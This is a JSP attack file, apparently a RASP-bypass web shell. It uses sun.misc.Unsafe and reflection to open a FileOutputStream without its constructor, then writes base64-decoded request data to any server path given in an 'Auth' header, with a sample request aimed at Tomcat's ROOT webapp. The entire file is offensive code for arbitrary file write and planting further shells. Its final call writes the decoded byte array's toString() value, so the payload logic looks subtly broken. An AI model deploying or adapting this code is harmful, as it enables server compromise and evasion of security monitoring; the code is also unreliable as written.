<!--
GET /bypass-rasp-writefile.jsp HTTP/1.1
Host: 127.0.0.1:8086
Accept: */*
Auth: /opt/apache-tomcat/webapps/ROOT/file.jsp
Connection: close

dXNlZnVsLWNvZGU=
-->

<%@ page import="java.lang.reflect.Field" %>
<%@ page import="sun.misc.Unsafe" %>
<%@ page import="java.io.FileOutputStream" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileDescriptor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.Closeable" %>
<%@ page import="java.nio.charset.StandardCharsets" %>


<%!
    public static void WriteFile(String fileName, String content) throws Exception {
        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe)field.get((Object)null);
        FileOutputStream fileOutputStream = (FileOutputStream)unsafe.allocateInstance(FileOutputStream.class);
        File file = new File(fileName);
        String name = file != null ? file.getPath() : null;
        SecurityManager security = System.getSecurityManager();
        if (security != null) {
            security.checkWrite(name);
        }

        if (name == null) {
            throw new NullPointerException();
        } else {
            boolean append = true;
            Field fdField = FileOutputStream.class.getDeclaredField("fd");
            fdField.setAccessible(true);
            FileDescriptor fd = new FileDescriptor();
            fdField.set(fileOutputStream, fd);
            Method attachMethod = FileDescriptor.class.getDeclaredMethod("attach", Closeable.class);
            attachMethod.setAccessible(true);
            attachMethod.invoke(fd, fileOutputStream);
            Field appendFiled = FileOutputStream.class.getDeclaredField("append");
            appendFiled.setAccessible(true);
            appendFiled.set(fileOutputStream, append);
            Field pathField = FileOutputStream.class.getDeclaredField("path");
            pathField.setAccessible(true);
            pathField.set(fileOutputStream, name);
            Method openMethod = FileOutputStream.class.getDeclaredMethod("open", String.class, Boolean.TYPE);
            openMethod.setAccessible(true);
            openMethod.invoke(fileOutputStream, name, append);
            fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8));
        }
    }

%>

<%
    WriteFile(request.getHeader("Auth"), new sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream()).toString());
%>
